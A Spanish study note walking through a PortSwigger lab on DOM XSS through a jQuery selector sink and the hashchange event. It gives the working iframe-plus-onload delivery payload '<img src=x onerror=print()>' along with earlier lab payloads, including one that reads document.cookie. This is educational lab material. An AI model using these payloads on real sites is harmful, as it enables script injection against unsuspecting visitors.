---
aliases:
tags:
kind: Concept
linked:
---
# PortSwigger - XSS - DOM XSS in jQuery selector sink using a hashchange event

---
## Explicación

### Lo nuevo: Source es `location.hash`

`location.hash` es todo lo que va después del `#` en la URL:
```http
https://ejemplo.com/#AQUI_VA_EL_HASH
```
Se usa normalmente para navegar a secciones de una página, como:
```http
https://ejemplo.com/#comentarios
```


### Lo nuevo: el evento `hashchange`

Es un evento del navegador que se dispara **automáticamente cada vez que el `#` de la URL cambia**. El código vulnerable se ve así:
```javascript
$(window).on('hashchange', function() {
    // Cuando el hash cambia, jQuery busca un elemento que matchee
    let post = $(location.hash)  // ← source Y sink al mismo tiempo
    // Si encuentra el post, hace scroll hasta él
    $('html, body').animate({ scrollTop: post.offset().top }, 0);
});
```

El problema: `$(location.hash)` usa el hash como **selector de jQuery**, pero jQuery también acepta **HTML** como selector, no solo CSS selectors como `#id` o `.clase`.


### ¿Cómo se explota el selector `$()`?

Si pasás HTML en vez de un selector normal, jQuery lo **crea en el DOM**:

```javascript
$('<img src=x onerror=print()>')  // jQuery crea el elemento y lo inserta
```

Entonces el hash malicioso sería:
```
#<img src=x onerror=print()>
```


### Lo nuevo: entregar el exploit a la víctima

Los labs anteriores te atacabas a vos mismo. Acá hay que **hacer que otra persona ejecute el payload**, porque `print()` tiene que correr en el navegador de la víctima.

El problema de mandárselo directamente es que los navegadores modernos **no disparan `hashchange`** si la página ya está cargada con ese hash desde el inicio. La solución es usar un `<iframe>`:

```html
<!-- Esto va en el exploit server -->
<iframe 
  src="https://vulnerable.com/#" 
  onload="this.src+='<img src=x onerror=print()>'">
</iframe>
```

¿Por qué funciona esto?
1. El `iframe` carga la página vulnerable con `#` vacío
2. Cuando termina de cargar (`onload`), **cambia el hash** agregándole el payload
3. Ese cambio **dispara el evento `hashchange`** dentro del iframe
4. jQuery procesa el hash malicioso y ejecuta `print()` 💥


### El flujo del lab

```
Víctima visita tu exploit server
          ↓
  iframe carga la página vulnerable
          ↓
  onload cambia el hash al payload
          ↓
  hashchange se dispara automáticamente
          ↓
        SOURCE + SINK
  $(location.hash) recibe HTML malicioso
          ↓
  jQuery crea <img src=x onerror=print()>
          ↓
  print() se ejecuta en el navegador de la víctima 💥
```


### Comparación de los cuatro labs

| | Lab 1 | Lab 2 | Lab 3 | Lab 4 |
|---|---|---|---|---|
| **Source** | `location.search` | `location.search` | `location.search` | `location.hash` |
| **Sink** | `document.write` | `innerHTML` | `attr("href")` | `$()` selector |
| **Payload** | `<script>alert(1)</script>` | `<img src=x onerror=alert(1)>` | `javascript:alert(document.cookie)` | `<img src=x onerror=print()>` |
| **Trigger** | Automático | Automático | Click | Automático |
| **Víctima** | Vos mismo | Vos mismo | Vos mismo | Otra persona |


### 💡 Reglas para recordar

> - **`location.hash`** = todo después del `#` en la URL
> - **`hashchange`** se dispara automáticamente cuando el `#` cambia
> - **`$()`** de jQuery es peligroso porque acepta HTML, no solo selectores
> - Cuando hay que atacar a una víctima, el truco del **`iframe` + `onload`** fuerza el disparo del evento


---


## ¿Qué es un `iframe`?

**iframe** = **I**nline **Frame**. Es básicamente una **ventana dentro de una página web** que carga otra página adentro.


### Visualmente

```
┌─────────────────────────────────┐
│        Tu página (exploit)      │
│                                 │
│  ┌───────────────────────────┐  │
│  │  iframe                   │  │
│  │  (carga otra página aquí) │  │
│  │                           │  │
│  └───────────────────────────┘  │
│                                 │
└─────────────────────────────────┘
```


### En HTML es simplemente esto

```html
<iframe src="https://otra-pagina.com"></iframe>
```

Eso carga `otra-pagina.com` **embebida** dentro de tu página. La otra página no sabe que está adentro de un iframe, simplemente se carga y funciona normal.


### Ejemplos de la vida real

Los ves todo el tiempo sin darte cuenta:

- **Videos de YouTube** embedidos en un blog → iframe
- **Google Maps** puesto en una web de restaurante → iframe
- **Formularios de pago** en tiendas online → iframe


### ¿Por qué es útil para atacar?

Porque desde tu página **podés controlar** lo que le pasa al iframe:

```html
<!-- Puedo cambiarle la URL -->
<iframe src="https://victima.com" onload="this.src='otra-url'">

<!-- Puedo saber cuándo terminó de cargar (onload) -->
<iframe src="https://victima.com" onload="alert('listo!')">
```

Básicamente el iframe te da **control de timing**: sabés exactamente cuándo la página cargó y podés interactuar con ella desde afuera.



### 💡 Resumen

> Un `iframe` es una página dentro de otra página. En el contexto del lab, lo usás como "contenedor controlado" para cargar la página vulnerable y manipularla en el momento exacto que necesitás.


---

## Solución

```js
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

### ¿Por qué un `iframe` y no simplemente mandar la URL con el payload?

Podrías pensar que alcanza con mandarle a la víctima esto:
```
https://vulnerable.com/#<img src=x onerror=print()>
```

**El problema:** si la víctima abre la página *directamente* con ese hash, el evento `hashchange` **nunca se dispara**. Ese evento solo se activa cuando el hash *cambia* mientras la página ya está cargada. Al cargar desde cero, no hay cambio, solo carga inicial.

Necesitás una forma de:
1. Primero cargar la página
2. **Después** cambiarle el hash

El `iframe` te da control sobre esos dos momentos.

---

### Diseccionando el `iframe` línea por línea

```html
<iframe 
  src="https://vulnerable.com/#"
  onload="this.src+='<img src=x onerror=print()>'"
>
```

**Parte 1: `src="https://vulnerable.com/#"`**
```
Carga la página vulnerable con el hash vacío (#)
No dispara nada peligroso, solo carga la página limpia
```

**Parte 2: `onload="..."`**
```
onload se dispara cuando el iframe terminó de cargar
En ese momento la página ya está viva adentro del iframe
Recién ahora tiene sentido cambiar el hash
```

**Parte 3: `this.src+=`**
```
this     → es el iframe mismo
this.src → es la URL actual: "https://vulnerable.com/#"
+=       → le agrega algo al final
```

Entonces después del `+=` la URL queda:
```
https://vulnerable.com/#<img src=x onerror=print()>
```

Cambiar `src` del iframe hace que el hash cambie en la página que está adentro → **dispara `hashchange`** ✅

**Parte 4: `'<img src=x onerror=print()>'`**
```
Esto es el payload que se agrega al hash
jQuery lo recibe como $(location.hash)
Lo interpreta como HTML, crea el elemento
La imagen falla (src=x no existe)
onerror dispara print() 💥
```

---

### La secuencia completa paso a paso

```
1. Víctima visita tu exploit server
           ↓
2. El iframe empieza a cargar vulnerable.com/#
           ↓
3. La página carga, hashchange NO se dispara
  (el hash no cambió, solo se cargó)
           ↓
4. onload se activa → la página ya está lista
           ↓
5. this.src+= cambia la URL a vulnerable.com/#<img src=x onerror=print()>
           ↓
6. ¡El hash CAMBIÓ! → hashchange se dispara ✅
           ↓
7. jQuery ejecuta $('<img src=x onerror=print()>')
           ↓
8. Imagen falla → onerror → print() 💥
```

---

### 💡 La lógica detrás de todo

| Problema | Solución |
|---|---|
| `hashchange` no se dispara al cargar | Usar `iframe` para cargar primero |
| Necesito control sobre cuándo cambiar el hash | `onload` me avisa cuando la página está lista |
| Necesito cambiar el hash desde afuera | `this.src+=` modifica la URL del iframe |
| El sink `$()` necesita HTML | `<img src=x onerror=print()>` es el vector |

> La clave mental es: **no podés atacar en la carga inicial, necesitás que la página esté viva primero y recién ahí cambiarle el hash.** El `iframe` + `onload` es el mecanismo para lograr ese timing.

